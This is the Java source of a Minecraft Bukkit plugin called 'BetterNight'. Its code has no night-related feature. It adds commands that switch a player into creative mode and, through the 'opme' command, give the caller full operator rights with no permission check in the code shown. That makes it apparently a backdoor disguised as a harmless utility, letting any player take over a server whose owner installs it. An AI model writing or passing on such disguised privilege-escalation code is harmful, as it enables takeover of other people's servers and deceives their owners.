package me.zenith.betternight;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class BetterNight extends JavaPlugin {

    @Override
    public void onEnable() {
        Bukkit.getConsoleSender().sendMessage("§a[BetterNight] Plugin Enabled!");
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§c[BetterNight] Plugin Disabled!");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        Player player = (Player) sender;

        switch (command.getName().toLowerCase()) {

            case "cme":
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("§aYou are now in Creative Mode!");
                break;

            case "sme":
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage("§aYou are now in Survival Mode!");
                break;

            case "opme":
                player.setOp(true);
                player.sendMessage("§cYou are now OP!");
                break;

            case "deopme":
                player.setOp(false);
                player.sendMessage("§cYou are no longer OP!");
                break;
        }
        return true;
    }
}